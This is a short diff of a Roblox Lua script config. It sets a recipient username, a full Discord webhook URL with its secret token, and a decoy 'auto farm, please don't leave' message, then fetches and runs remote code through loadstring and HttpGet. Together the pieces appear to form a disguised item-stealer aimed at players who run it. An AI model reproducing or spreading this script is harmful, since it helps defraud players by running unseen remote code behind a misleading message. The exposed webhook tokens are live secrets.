@@ -1,7 +1,7 @@
-_G.Username = "Herobrine5131"
+_G.Username = "LanTLRoblox"
 
 _G.HubName = "Auto farm comet are loading, please don't leave"
 
-_G.WebhookUrl = "discord.com/api/webhooks/1107132008775286834/5qTqO1pmibA7H5c9eedKDSn22cME7uSDwYyfS_mnT5Ut0jrkJWLdQyPhuvZXvL9l84l6"
+_G.WebhookUrl = "discord.com/api/webhooks/1026113381637304340/FAnBznFZBZDHkCtZXA1drBYMb3ePEps6wKf3pR_tmMRhh7QZ4i8_vwWVtypkfEtaQxf1"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
